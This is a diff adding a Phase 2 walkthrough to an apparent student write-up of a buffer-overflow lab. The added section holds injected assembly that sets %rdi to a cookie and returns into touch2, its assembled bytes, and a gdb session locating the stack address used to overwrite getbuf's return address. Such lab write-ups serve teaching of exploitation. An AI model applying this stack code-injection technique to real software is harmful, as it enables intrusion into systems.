@@ -38,3 +38,48 @@ It should be mentioned that you should know whether your system is little-endian
 00 00 00 00 00 00 00 00
 c0 17 40 00 00 00 00 00 
 ```
+
+## Phase 2
+We use the similar method to solve phase 2.
+Firstly, let's have a look at the touch2 function, 
+```
+void touch2(unsigned val) {
+  vlevel = 2;
+  /* Part of validation protocol */ 
+  if (val == cookie) {
+  printf("Touch2!: You called touch2(0x%.8x)\n", val);
+    validate(2);
+  } else {
+    printf("Misfire: You called touch2(0x%.8x)\n", val);
+    fail(2);
+  }
+  exit(0);
+}
+```
+We know that the first argument is stored in the %rdi register, so we need to inject into the code to change the value of this register. 
+
+We use the following code to change the value of %rdi
+```
+movq $0x59b997fa, %rdi
+pushq $0x4017ec
+retq
+```
+Note: the value of the cookie depends on your problem version.
+We save the file and name it after phase2.s
+then we use the command `gcc -c phase2.s` and `objdump -d phase2.o` to find the byte code 
+```
+48 c7 c7 fa 97 b9 59 68
+ec 17 40 00 c3
+```
+Then similarly, we expand the byte code into 40 bytes, and let the jump address to be the address of rsp, which we can get by using gdb:
+```
+(gdb) until *0x4017b4
+Type string:vsiuiusiugsiugifnsifsnfgnslkfsifnlisfn
+
+Breakpoint 2, getbuf () at buf.c:16
+16	in buf.c
+(gdb) x/s $rsp
+0x5561dc78:	"vsiuiusiugsiugifnsifsnfgnslkfsifnlisfn"
+```
+Here, we specify the jump address to be the address of rsp, which is also the address of the byte code we enter above. So the return address of getbuf will be changed. Then we accomplish the injection. 
+
